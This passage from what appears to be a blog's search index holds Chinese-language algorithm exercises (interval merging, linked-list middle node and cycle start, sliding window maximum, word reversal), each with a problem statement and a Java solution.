          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区间合并</title>
      <link href="/2018/12/09/suan-fa/qu-jian-he-bing/"/>
      <url>/2018/12/09/suan-fa/qu-jian-he-bing/</url>
      
        <content type="html"><![CDATA[<h2 id="区间合并"><a href="#区间合并" class="headerlink" title="区间合并"></a>区间合并</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个区间集合，你要把有重叠的区间合并起来。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的区间集合是：[1, 8][2, 4][9, 10][10, 16]这 4 个区间里，[1, 8] 区间包含了 [2, 4] 区间，于是它们合并后是 [1, 8]。[9, 10] 区间和 [10, 16] 区间相邻，合并起来后是 [9, 16]。最后得到合并后的区间有两个：[1, 8][9, 16]</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Interval</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> start<span class="token punctuation">;</span>    <span class="token keyword">int</span> end<span class="token punctuation">;</span>    <span class="token function">Interval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> start <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> end <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token function">Interval</span><span class="token punctuation">(</span><span class="token keyword">int</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span> start <span class="token operator">=</span> s<span class="token punctuation">;</span> end <span class="token operator">=</span> e<span class="token punctuation">;</span> <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n*log(n)), Space: O(1)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Interval<span class="token operator">></span> <span class="token function">merge</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>Interval<span class="token operator">></span> intervals<span class="token punctuation">)</span> <span class="token punctuation">{</span>    List<span class="token operator">&lt;</span>Interval<span class="token operator">></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    intervals<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> a<span class="token punctuation">.</span>start <span class="token operator">-</span> b<span class="token punctuation">.</span>start<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>Interval in<span class="token operator">:</span> intervals<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> n <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> result<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>end <span class="token operator">&lt;</span> in<span class="token punctuation">.</span>start<span class="token punctuation">)</span> <span class="token punctuation">{</span>        result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        result<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>end <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>end<span class="token punctuation">,</span> in<span class="token punctuation">.</span>end<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单链表中间节点</title>
      <link href="/2018/12/09/suan-fa/lian-biao/dan-lian-biao-zhong-jian-jie-dian/"/>
      <url>/2018/12/09/suan-fa/lian-biao/dan-lian-biao-zhong-jian-jie-dian/</url>
      
        <content type="html"><![CDATA[<h2 id="单链表中间节点"><a href="#单链表中间节点" class="headerlink" title="单链表中间节点"></a>单链表中间节点</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个单链表，你要返回它正中间的节点。如果链表节点数量是偶数个，这个时候正中间有两个节点，你要返回它们中第二个节点。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的单链表是：0 -> 1 -> 2 -> 4 -> 8你要返回的正中间节点是 2。如果给你的链表有偶数个节点，比如：0 -> 1 -> 2 -> 4正中间的节点是 1 和 2，你要返回它们中第二个节点，也就是节点 2。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    ListNode next<span class="token punctuation">;</span>    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> ListNode <span class="token function">getMiddleNodeTwoPass</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ListNode p <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> p <span class="token operator">!=</span> null<span class="token punctuation">;</span> p <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token operator">++</span>len<span class="token punctuation">;</span>    p <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> p <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token keyword">return</span> p<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> ListNode <span class="token function">getMiddleNodeOnePass</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ListNode fast <span class="token operator">=</span> head<span class="token punctuation">,</span> slow <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>fast <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> fast<span class="token punctuation">.</span>next <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>      fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> slow<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>滑动窗口中的最大值</title>
      <link href="/2018/12/09/suan-fa/hua-dong-chuang-kou-zhong-de-zui-da-zhi/"/>
      <url>/2018/12/09/suan-fa/hua-dong-chuang-kou-zhong-de-zui-da-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="滑动窗口中的最大值"><a href="#滑动窗口中的最大值" class="headerlink" title="滑动窗口中的最大值"></a>滑动窗口中的最大值</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个整数数组和整数 k，k 表示滑动窗口的大小，滑动窗口从左向右滑过数组，每移动一个位置，你要计算出当前滑动窗口内 k 个数字的最大值。最后返回这个最大值数组。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的数组是 0, 4, 2, 1, 0, 8, 2，给你的滑动窗口大小 k 等于 3。我们使用大小为 3 的滑动窗口，来找到这个最大值序列。<span class="token list punctuation">*</span> 第一个滑动窗口内的数字是 0, 4, 2，最大值为 4<span class="token list punctuation">*</span> 移动窗口，窗口内数字变为 4, 2, 1，最大值仍然为 4<span class="token list punctuation">*</span> 继续移动窗口，窗口内数字变为 2, 1, 0，最大值变为 2<span class="token list punctuation">*</span> 接着移动窗口，窗口内数字变为 1, 0, 8，最大值变为 8<span class="token list punctuation">*</span> 继续移动窗口，最后窗口内的数字变为 0, 8, 2，最大值仍然是 8这时滑动窗口再移动的话，窗口内的数字就不足 k 个，于是结束处理过程。最后就得到了最大值数组 4, 4, 2, 8, 8。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(k*n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">maxNumInSlidingWindowBruteForce</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n <span class="token operator">-</span> k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> left <span class="token operator">&lt;=</span> n<span class="token operator">-</span>k<span class="token punctuation">;</span> <span class="token operator">++</span>left<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> max <span class="token operator">=</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> left<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> left<span class="token operator">+</span>k<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        max <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      result<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">=</span> max<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n*log(k)), Space: O(k)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">maxNumInSlidingWindowTreeMap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">,</span> p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    TreeMap<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> Integer<span class="token operator">></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n <span class="token operator">-</span> k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    result<span class="token punctuation">[</span>p<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">lastKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> k<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">-</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> i<span class="token operator">-</span>k<span class="token punctuation">)</span> map<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">-</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>      result<span class="token punctuation">[</span>p<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">lastKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">maxNumInSlidingWindowOn</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n <span class="token operator">-</span> k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> maxFromLeft <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> maxFromRight <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    maxFromLeft<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    maxFromRight<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">=</span> n<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">,</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>      maxFromLeft<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">%</span> k <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">:</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>maxFromLeft<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      maxFromRight<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> j <span class="token operator">%</span> k <span class="token operator">==</span> k<span class="token operator">-</span><span class="token number">1</span> <span class="token operator">?</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">:</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>maxFromRight<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token operator">-</span>k<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>maxFromRight<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> maxFromLeft<span class="token punctuation">[</span>i<span class="token operator">+</span>k<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单链表中圆环的开始节点</title>
      <link href="/2018/12/09/suan-fa/lian-biao/dan-lian-biao-zhong-yuan-huan-de-kai-shi-jie-dian/"/>
      <url>/2018/12/09/suan-fa/lian-biao/dan-lian-biao-zhong-yuan-huan-de-kai-shi-jie-dian/</url>
      
        <content type="html"><![CDATA[<h2 id="单链表中圆环的开始节点"><a href="#单链表中圆环的开始节点" class="headerlink" title="单链表中圆环的开始节点"></a>单链表中圆环的开始节点</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个单链表，你要返回这个链表中，圆环的开始节点。如果单链表无环，就返回空指针。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的单链表是：1 -> 2 -> 4 -> 8 -> 2// 最后的 2 和前面的 2 是同一个节点这个链表中存在环，并且环的开始节点是 2，于是你要返回节点 2。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    ListNode next<span class="token punctuation">;</span>    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> ListNode <span class="token function">startNodeOfCycleHashSet</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Set<span class="token operator">&lt;</span>ListNode<span class="token operator">></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>ListNode p <span class="token operator">=</span> head<span class="token punctuation">;</span> p <span class="token operator">!=</span> null<span class="token punctuation">;</span> p <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>set<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> p<span class="token punctuation">;</span>      set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> null<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> ListNode <span class="token function">startNodeOfCycleTwoPointer</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ListNode fast <span class="token operator">=</span> head<span class="token punctuation">,</span> slow <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>fast <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> fast<span class="token punctuation">.</span>next <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>      fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>fast <span class="token operator">==</span> slow<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>ListNode p <span class="token operator">=</span> head<span class="token punctuation">;</span> p <span class="token operator">!=</span> slow<span class="token punctuation">;</span> p <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">,</span> slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> slow<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> null<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反转单词</title>
      <link href="/2018/12/09/suan-fa/fan-zhuan-dan-ci/"/>
      <url>/2018/12/09/suan-fa/fan-zhuan-dan-ci/</url>
      
        <content type="html"><![CDATA[<h2 id="反转单词"><a href="#反转单词" class="headerlink" title="反转单词"></a>反转单词</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个字符串，你要写一个函数反转这个字符串中的单词，然后返回处理后的字符串。注意，单词之间只用一个空格隔开。</p><pre class=" language-markdown"><code class="language-markdown">比如说给你的字符串是："I am busy."反转这个字符串中的 3 个单词，得到："I ma .ysub"注意，最后的句号要连同单词一起反转。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> String <span class="token function">reverseWords</span><span class="token punctuation">(</span>String s<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> null <span class="token operator">||</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> s<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> c <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> start <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>start <span class="token operator">&lt;</span> c<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span>end <span class="token operator">&lt;</span> c<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> c<span class="token punctuation">[</span>end<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">' '</span><span class="token punctuation">)</span> <span class="token operator">++</span>end<span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> start<span class="token punctuation">,</span> j <span class="token operator">=</span> end<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">,</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> tmp <span class="token operator">=</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        c<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        c<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      start <span class="token operator">=</span> end <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>      end <span class="token operator">=</span> start<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有序数组中的单身数字</title>
